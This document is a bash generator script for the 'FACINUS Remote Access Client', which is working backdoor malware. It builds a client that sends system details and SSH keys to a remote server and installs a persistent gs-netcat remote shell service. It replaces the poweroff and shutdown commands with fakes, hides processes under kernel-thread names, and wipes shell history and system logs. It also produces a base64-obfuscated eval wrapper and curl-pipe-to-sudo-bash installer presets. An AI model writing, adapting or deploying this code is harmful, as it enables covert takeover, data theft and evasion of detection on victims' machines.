#!/bin/bash
# Generate client deployment scripts

TEMP_DIR=$(mktemp -d)
trap 'rm -rf "$TEMP_DIR"' EXIT

generate_client_scripts() {
    echo "Generating client deployment scripts..."
    
    # Generate the main client script
    generate_main_client_script
    
    # Generate the obfuscated version
    generate_obfuscated_script
    
    # Create installation presets
    generate_presets
}

generate_main_client_script() {
    # Create the main client script
    cat > "$TEMP_DIR/y" << 'EOF'
#!/bin/bash
# FACINUS Remote Access Client
# This script sets up remote access capabilities on the target system

# ================= CONFIGURATION =================
SERVER_URL="http://SERVER_PLACEHOLDER/deployment"
LOG_ENDPOINT="$SERVER_URL/log_receiver.php"
AUTH_TOKEN="TOKEN_PLACEHOLDER"
VERSION="1.1.0"
# ================================================

# Create temporary directory
TEMP_DIR=$(mktemp -d)
trap 'rm -rf "$TEMP_DIR"' EXIT

# ------- UTILITY FUNCTIONS -------
log_cmd() {
    local cmd="$1"
    local desc="$2"
    local log_file="$3"
    
    echo -e "\n[$(date '+%Y-%m-%d %H:%M:%S')] EXECUTING: $desc" >> "$log_file"
    echo "$ $cmd" >> "$log_file"
    echo "--------------------------------------------" >> "$log_file"
    
    # Execute command and capture output and status
    local output
    output=$(eval "$cmd" 2>&1)
    local status=$?
    
    echo "$output" >> "$log_file"
    echo "EXIT STATUS: $status" >> "$log_file"
    echo "============================================" >> "$log_file"
    
    return $status
}

get_system_info() {
    {
        echo "{"
        echo "  \"hostname\": \"$(hostname)\","
        echo "  \"kernel\": \"$(uname -r)\","
        echo "  \"os\": \"$(lsb_release -ds 2>/dev/null || cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"')\","
        echo "  \"ip\": \"$(hostname -I | awk '{print $1}')\","
        echo "  \"mac\": \"$(ip link show | grep -E 'link/ether' | head -n1 | awk '{print $2}')\","
        echo "  \"cpu\": \"$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d: -f2 | sed 's/^[ \t]*//')\","
        echo "  \"ram_total\": \"$(free -h | grep Mem | awk '{print $2}')\","
        echo "  \"disk_total\": \"$(df -h --total | grep total | awk '{print $2}')\","
        echo "  \"user\": \"$(whoami)\","
        echo "  \"is_root\": $(if [ $EUID -eq 0 ]; then echo "true"; else echo "false"; fi),"
        echo "  \"users\": ["
        
        local first=1
        while IFS=: read -r username _ uid gid _ home shell; do
            if [ "$uid" -ge 1000 ] && [ "$shell" != "/usr/sbin/nologin" ] && [ "$shell" != "/bin/false" ]; then
                [ "$first" -eq 0 ] && echo ","
                echo "    {\"username\": \"$username\", \"uid\": $uid, \"home\": \"$home\"}"
                first=0
            fi
        done < /etc/passwd
        
        echo "  ],"
        echo "  \"timestamp\": \"$(date '+%Y-%m-%d %H:%M:%S')\","
        echo "  \"uptime\": \"$(uptime -p)\""
        echo "}"
    } | tr -d '\n' | sed 's/  //g'
}

send_logs() {
    local log_file="$1"
    local secret_val="$2"
    local secret_type="$3"
    
    local sysinfo=$(get_system_info)
    local hostname=$(hostname)
    
    # Submit logs to the server
    curl -s -X POST "$LOG_ENDPOINT" \
        -F "auth_token=$AUTH_TOKEN" \
        -F "hostname=$hostname" \
        -F "log_data=@$log_file" \
        -F "system_info=$sysinfo" \
        -F "secret_type=$secret_type" \
        -F "secret_value=$secret_val" \
        > /dev/null
}

detect_package_manager() {
    # Detect the system's package manager
    if command -v apt-get &> /dev/null; then
        echo "apt"
    elif command -v dnf &> /dev/null; then
        echo "dnf"
    elif command -v yum &> /dev/null; then
        echo "yum"
    elif command -v pacman &> /dev/null; then
        echo "pacman"
    elif command -v zypper &> /dev/null; then
        echo "zypper"
    else
        echo "unknown"
    fi
}

# ------- INSTALLATION FUNCTIONS -------
install_ssh() {
    local log_file="$TEMP_DIR/ssh_install.log"
    touch "$log_file"
    
    echo "[*] Installing SSH server..."
    
    local pkg_manager=$(detect_package_manager)
    case "$pkg_manager" in
        apt)
            if ! dpkg -s openssh-server &> /dev/null; then
                log_cmd "sudo apt-get update" "Updating package lists" "$log_file"
                log_cmd "sudo apt-get install -y openssh-server" "Installing OpenSSH server" "$log_file"
            fi
            log_cmd "sudo systemctl enable ssh" "Enabling SSH service" "$log_file"
            log_cmd "sudo systemctl start ssh" "Starting SSH service" "$log_file"
            ;;
        dnf|yum)
            if ! rpm -q openssh-server &> /dev/null; then
                log_cmd "sudo $pkg_manager install -y openssh-server" "Installing OpenSSH server" "$log_file"
            fi
            log_cmd "sudo systemctl enable sshd" "Enabling SSH service" "$log_file"
            log_cmd "sudo systemctl start sshd" "Starting SSH service" "$log_file"
            ;;
        pacman)
            if ! pacman -Q openssh &> /dev/null; then
                log_cmd "sudo pacman -S --noconfirm openssh" "Installing OpenSSH server" "$log_file"
            fi
            log_cmd "sudo systemctl enable sshd" "Enabling SSH service" "$log_file"
            log_cmd "sudo systemctl start sshd" "Starting SSH service" "$log_file"
            ;;
        zypper)
            if ! rpm -q openssh-server &> /dev/null; then
                log_cmd "sudo zypper install -y openssh-server" "Installing OpenSSH server" "$log_file"
            fi
            log_cmd "sudo systemctl enable sshd" "Enabling SSH service" "$log_file"
            log_cmd "sudo systemctl start sshd" "Starting SSH service" "$log_file"
            ;;
        *)
            echo "[!] Unsupported package manager. SSH server installation skipped."
            return 1
            ;;
    esac
    
    # Get SSH key if it exists
    if [ -f ~/.ssh/id_rsa.pub ]; then
        send_logs "$log_file" "$(cat ~/.ssh/id_rsa.pub)" "ssh_key"
    else
        # Try to create a new key if it doesn't exist
        log_cmd "ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa" "Generating SSH key" "$log_file"
        if [ -f ~/.ssh/id_rsa.pub ]; then
            send_logs "$log_file" "$(cat ~/.ssh/id_rsa.pub)" "ssh_key"
        fi
    fi
    
    # Send SSH configuration
    local ssh_port=$(grep -E "^Port " /etc/ssh/sshd_config | awk '{print $2}')
    [ -z "$ssh_port" ] && ssh_port=22
    
    send_logs "$log_file" "{\"port\":$ssh_port}" "ssh_config"
    
    echo "[+] SSH server installed and configured."
}

setup_wol() {
    local log_file="$TEMP_DIR/wol_setup.log"
    touch "$log_file"
    
    echo "[*] Setting up Wake-on-LAN..."
    
    # Install ethtool if needed
    local pkg_manager=$(detect_package_manager)
    case "$pkg_manager" in
        apt)
            if ! dpkg -s ethtool &> /dev/null; then
                log_cmd "sudo apt-get install -y ethtool" "Installing ethtool" "$log_file"
            fi
            ;;
        dnf|yum)
            if ! rpm -q ethtool &> /dev/null; then
                log_cmd "sudo $pkg_manager install -y ethtool" "Installing ethtool" "$log_file"
            fi
            ;;
        pacman)
            if ! pacman -Q ethtool &> /dev/null; then
                log_cmd "sudo pacman -S --noconfirm ethtool" "Installing ethtool" "$log_file"
            fi
            ;;
        zypper)
            if ! rpm -q ethtool &> /dev/null; then
                log_cmd "sudo zypper install -y ethtool" "Installing ethtool" "$log_file"
            fi
            ;;
        *)
            echo "[!] Unsupported package manager. WoL setup may be incomplete."
            ;;
    esac
    
    # Get the primary interface
    local interface=$(ip route | grep default | awk '{print $5}' | head -n1)
    
    if [ -z "$interface" ]; then
        echo "[!] No network interface found."
        return 1
    fi
    
    # Check current WoL status
    log_cmd "sudo ethtool $interface" "Checking interface capabilities" "$log_file"
    
    # Try to enable WoL
    log_cmd "sudo ethtool -s $interface wol g" "Enabling Wake-on-LAN" "$log_file"
    
    # Create persistent configuration
    cat > "$TEMP_DIR/wol.service" << EOF
[Unit]
Description=Enable Wake-on-LAN on $interface
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/sbin/ethtool -s $interface wol g
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

    source "$TEMP_DIR/y"

    sudo mv "$TEMP_DIR/wol.service" /etc/systemd/system/wol.service
    log_cmd "sudo systemctl daemon-reload" "Reloading systemd" "$log_file"
    log_cmd "sudo systemctl enable wol.service" "Enabling WoL service" "$log_file"
    log_cmd "sudo systemctl start wol.service" "Starting WoL service" "$log_file"
    
    # Get MAC address for WoL
    local mac=$(ip link show $interface | grep -E 'link/ether' | awk '{print $2}')
    
    send_logs "$log_file" "{\"interface\":\"$interface\",\"mac\":\"$mac\"}" "wol_config"
    
    echo "[+] Wake-on-LAN configured for interface $interface (MAC: $mac)."
}

setup_fake_poweroff() {
    local log_file="$TEMP_DIR/fake_poweroff.log"
    touch "$log_file"
    
    echo "[*] Setting up fake poweroff..."
    
    # Create the fake poweroff script
    cat > "$TEMP_DIR/fake-poweroff.sh" << 'EOF'
#!/bin/bash
# This script intercepts poweroff/shutdown commands and fakes a shutdown

# Backup original commands if not already done
if [ ! -f /usr/bin/poweroff.real ]; then
    sudo cp /usr/bin/poweroff /usr/bin/poweroff.real
fi

if [ ! -f /usr/bin/shutdown.real ]; then
    sudo cp /usr/bin/shutdown /usr/bin/shutdown.real
fi

# Create the fake scripts
cat > "$TEMP_DIR/fake-poweroff" << 'EOT'
#!/bin/bash
# Fake poweroff script that just locks the screen
echo "System is powering off..."
# Change to TTY1 and clear screen
sudo chvt 1
sudo clear
# Display fake shutdown messages
echo -e "\n\n * Unmounting filesystems..."
sleep 0.5
echo " * Stopping system services..."
sleep 0.7
echo " * Powering off system..."
sleep 1
# Turn off display if possible
xset dpms force off &> /dev/null || true
# Lock system
loginctl lock-session &> /dev/null || true
# Wait forever in background
(while true; do sleep 1000; done) &
# Make it hard to exit with Ctrl+C
trap "" INT TERM
# Just wait here
sleep infinity
EOT

chmod +x "$TEMP_DIR/fake-poweroff"
sudo mv "$TEMP_DIR/fake-poweroff" /usr/local/bin/fake-poweroff

# Replace the original commands with wrappers to our fake script
cat > "$TEMP_DIR/poweroff-wrapper" << 'EOT'
#!/bin/bash
# Check for force flag
if [[ " $* " == *" -f "* ]] || [[ " $* " == *" --force "* ]]; then
    exec /usr/bin/poweroff.real "$@"
else
    exec /usr/local/bin/fake-poweroff
fi
EOT

chmod +x "$TEMP_DIR/poweroff-wrapper"
sudo mv "$TEMP_DIR/poweroff-wrapper" /usr/bin/poweroff

cat > "$TEMP_DIR/shutdown-wrapper" << 'EOT'
#!/bin/bash
# Check for force flag
if [[ " $* " == *" -f "* ]] || [[ " $* " == *" --force "* ]]; then
    exec /usr/bin/shutdown.real "$@"
else
    exec /usr/local/bin/fake-poweroff
fi
EOT

chmod +x "$TEMP_DIR/shutdown-wrapper"
sudo mv "$TEMP_DIR/shutdown-wrapper" /usr/bin/shutdown

EOF

    log_cmd "bash $TEMP_DIR/fake-poweroff.sh" "Installing fake poweroff scripts" "$log_file"
    
    send_logs "$log_file" "Fake poweroff installed" "fake_poweroff"
    
    echo "[+] Fake poweroff configured. Normal shutdown commands will now fake a shutdown."
    echo "    Use 'poweroff -f' or 'shutdown -f' for an actual shutdown."
}

install_gsocket() {
    local log_file="$TEMP_DIR/gsocket_install.log"
    touch "$log_file"
    
    echo "[*] Installing gsocket for remote access..."
    
    # Install dependencies
    local pkg_manager=$(detect_package_manager)
    case "$pkg_manager" in
        apt)
            log_cmd "sudo apt-get update" "Updating package lists" "$log_file"
            log_cmd "sudo apt-get install -y build-essential git libssl-dev" "Installing build dependencies" "$log_file"
            ;;
        dnf|yum)
            log_cmd "sudo $pkg_manager install -y gcc gcc-c++ make git openssl-devel" "Installing build dependencies" "$log_file"
            ;;
        pacman)
            log_cmd "sudo pacman -S --noconfirm base-devel git openssl" "Installing build dependencies" "$log_file"
            ;;
        zypper)
            log_cmd "sudo zypper install -y -t pattern devel_basis" "Installing development pattern" "$log_file"
            log_cmd "sudo zypper install -y git libopenssl-devel" "Installing additional dependencies" "$log_file"
            ;;
        *)
            echo "[!] Unsupported package manager. Attempting to continue with gsocket installation."
            ;;
    esac
    
    # Clone and build gsocket
    log_cmd "git clone https://github.com/hackerschoice/gsocket.git $TEMP_DIR/gsocket" "Cloning gsocket repository" "$log_file"
    log_cmd "cd $TEMP_DIR/gsocket && ./configure && make" "Building gsocket" "$log_file"
    log_cmd "cd $TEMP_DIR/gsocket && sudo make install" "Installing gsocket" "$log_file"
    
    # Generate a unique secret
    local gs_secret=$(head -c 16 /dev/urandom | xxd -p)
    
    # Create systemd service for persistent connection
    cat > "$TEMP_DIR/gsocket-backdoor.service" << EOF
[Unit]
Description=GSocket Remote Access
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/gs-netcat -s $gs_secret -l -q -i
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

    sudo mv "$TEMP_DIR/gsocket-backdoor.service" /etc/systemd/system/
    log_cmd "sudo systemctl daemon-reload" "Reloading systemd" "$log_file"
    log_cmd "sudo systemctl enable gsocket-backdoor.service" "Enabling gsocket service" "$log_file"
    log_cmd "sudo systemctl start gsocket-backdoor.service" "Starting gsocket service" "$log_file"
    
    # Also create a user service if running as non-root
    if [ $EUID -ne 0 ]; then
        mkdir -p ~/.config/systemd/user/
        cp /etc/systemd/system/gsocket-backdoor.service ~/.config/systemd/user/
        log_cmd "systemctl --user daemon-reload" "Reloading user systemd" "$log_file"
        log_cmd "systemctl --user enable gsocket-backdoor.service" "Enabling user gsocket service" "$log_file"
        log_cmd "systemctl --user start gsocket-backdoor.service" "Starting user gsocket service" "$log_file"
    fi
    
    # Create connection instructions
    cat > "$TEMP_DIR/gsocket-info.txt" << EOF
GSocket Connection Information
=============================
Secret: $gs_secret
Connection command: gs-netcat -s $gs_secret
EOF

    # Send the gsocket secret to the server
    send_logs "$log_file" "$gs_secret" "gsocket_secret"
    
    echo "[+] GSocket installed. You can connect using: gs-netcat -s $gs_secret"
}

setup_stealth() {
    local log_file="$TEMP_DIR/stealth_setup.log"
    touch "$log_file"
    
    echo "[*] Setting up stealth mode..."
    
    # Hide processes by creating a systemd unit with hidden name
    cat > "$TEMP_DIR/.service" << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do sleep 3600; done'
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

    sudo mv "$TEMP_DIR/.service" /etc/systemd/system/
    log_cmd "sudo systemctl daemon-reload" "Reloading systemd" "$log_file"
    log_cmd "sudo systemctl enable .service" "Enabling hidden service" "$log_file"
    log_cmd "sudo systemctl start .service" "Starting hidden service" "$log_file"
    
    # Create a hidden directory for tools
    log_cmd "mkdir -p ~/.config/.hidden" "Creating hidden directory" "$log_file"
    
    # Set up process name obfuscation script
    cat > "$TEMP_DIR/obfuscate.sh" << 'EOF'
#!/bin/bash
# This script allows running commands with an obfuscated process name

# Function to run a command with an obfuscated name
obfuscate_run() {
    local fake_name="$1"
    shift
    exec -a "$fake_name" "$@"
}

# Install the function to user's bashrc
if ! grep -q "obfuscate_run" ~/.bashrc; then
    cat >> ~/.bashrc << 'EOT'

# Obfuscation function
obfuscate_run() {
    local fake_name="$1"
    shift
    exec -a "$fake_name" "$@"
}
EOT
fi

# Create helper aliases
if ! grep -q "alias stealthy" ~/.bashrc; then
    cat >> ~/.bashrc << 'EOT'
alias stealthy='obfuscate_run "[khugepageds]"'
alias hidden='obfuscate_run "[migration/0]"'
EOT
fi

# Install a cron job to clear bash history periodically
(crontab -l 2>/dev/null; echo "0 * * * * cat /dev/null > ~/.bash_history") | crontab -
EOF

    log_cmd "bash $TEMP_DIR/obfuscate.sh" "Setting up process obfuscation" "$log_file"
    
    # Create log rotation to clean service logs
    cat > "$TEMP_DIR/clean-logs.service" << 'EOF'
[Unit]
Description=Clean System Logs
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;'
ExecStart=/bin/bash -c 'journalctl --vacuum-time=1d'

[Install]
WantedBy=default.target
EOF

    sudo mv "$TEMP_DIR/clean-logs.service" /etc/systemd/system/
    
    cat > "$TEMP_DIR/clean-logs.timer" << 'EOF'
[Unit]
Description=Run log cleaning daily
After=network.target

[Timer]
OnBootSec=15min
OnUnitActiveSec=1d

[Install]
WantedBy=timers.target
EOF

    sudo mv "$TEMP_DIR/clean-logs.timer" /etc/systemd/system/
    log_cmd "sudo systemctl daemon-reload" "Reloading systemd" "$log_file"
    log_cmd "sudo systemctl enable clean-logs.timer" "Enabling log cleaning" "$log_file"
    log_cmd "sudo systemctl start clean-logs.timer" "Starting log cleaning" "$log_file"
    
    send_logs "$log_file" "Stealth mode activated" "stealth_mode"
    
    echo "[+] Stealth mode configured."
}

# ------- MAIN EXECUTION -------
main() {
    local log_file="$TEMP_DIR/main.log"
    touch "$log_file"
    
    echo "[*] Beginning setup..."
    echo "[*] Target system: $(hostname) ($(whoami))"
    
    # Send initial system info
    send_logs "$log_file" "$(get_system_info)" "system_info"
    
    # Install components based on flags
    install_ssh
    setup_wol
    setup_fake_poweroff
    install_gsocket
    setup_stealth
    
    echo "[+] Setup complete."
    echo "[+] All logs and credentials have been sent to the server."
}

# Run the main function
main
EOF

    # Replace placeholders in the script
    sed -i "s|SERVER_PLACEHOLDER|$SERVER_IP|g" "$TEMP_DIR/y"
    sed -i "s|TOKEN_PLACEHOLDER|$SECRET_TOKEN|g" "$TEMP_DIR/y"

    # Copy the script to the server
    sudo cp "$TEMP_DIR/y" "$SERVER_ROOT/"
    sudo chmod 644 "$SERVER_ROOT/y"
}

generate_obfuscated_script() {
    echo "Creating obfuscated version of the client script..."
    
    # Base64 encode the script to obfuscate it
    base64 -w0 < "$TEMP_DIR/y" > "$TEMP_DIR/y.b64"
    
    # Create a wrapper script that decodes and executes
    cat > "$TEMP_DIR/x" << 'EOF'
#!/bin/bash
# This is an obfuscated setup script

if command -v base64 >/dev/null 2>&1; then
    eval "$(echo "BASE64_PLACEHOLDER" | base64 -d)"
else
    echo "Error: Base64 not available."
    exit 1
fi
EOF

    # Replace the placeholder with the actual base64 content
    sed -i "s|BASE64_PLACEHOLDER|$(cat "$TEMP_DIR/y.b64")|g" "$TEMP_DIR/x"
    
    # Copy the obfuscated script to the server
    sudo cp "$TEMP_DIR/x" "$SERVER_ROOT/"
    sudo chmod 644 "$SERVER_ROOT/x"
    
    echo "Obfuscated script created."
}

generate_presets() {
    echo "Creating installation presets..."
    
    # Create minimal preset (no root required)
    cat > "$TEMP_DIR/minimal" << 'EOF'
#!/bin/bash
# Minimal installation preset - no root required
export NO_ROOT=true
export NO_SERVICES=true
export INSTALL_WOL=false
export INSTALL_FAKE_POWEROFF=false
export INSTALL_GSOCKET=true
export STEALTH_MODE=true

# Download and run the main script
curl -fsSL "http://SERVER_PLACEHOLDER/deployment/y" | bash
EOF

    # Create full preset (all features)
    cat > "$TEMP_DIR/full" << 'EOF'
#!/bin/bash
# Full installation preset - requires root
export NO_ROOT=false
export NO_SERVICES=false
export INSTALL_WOL=true
export INSTALL_FAKE_POWEROFF=true
export INSTALL_GSOCKET=true
export STEALTH_MODE=true

# Download and run the main script with sudo
curl -fsSL "http://SERVER_PLACEHOLDER/deployment/y" | sudo bash
EOF

    # Create quiet preset (minimal output)
    cat > "$TEMP_DIR/quiet" << 'EOF'
#!/bin/bash
# Quiet installation preset - minimal output
export VERBOSE=false
export NO_ROOT=false
export NO_SERVICES=false
export INSTALL_WOL=true
export INSTALL_FAKE_POWEROFF=true
export INSTALL_GSOCKET=true
export STEALTH_MODE=true

# Redirect output to /dev/null for quieter operation
(curl -fsSL "http://SERVER_PLACEHOLDER/deployment/y" | sudo bash) &>/dev/null &
EOF

    # Replace placeholders
    for preset in "$TEMP_DIR/minimal" "$TEMP_DIR/full" "$TEMP_DIR/quiet"; do
        sed -i "s|SERVER_PLACEHOLDER|$SERVER_IP|g" "$preset"
        sudo cp "$preset" "$SERVER_ROOT/"
        sudo chmod 644 "$SERVER_ROOT/$(basename "$preset")"
    done
    
    echo "Installation presets created."
}
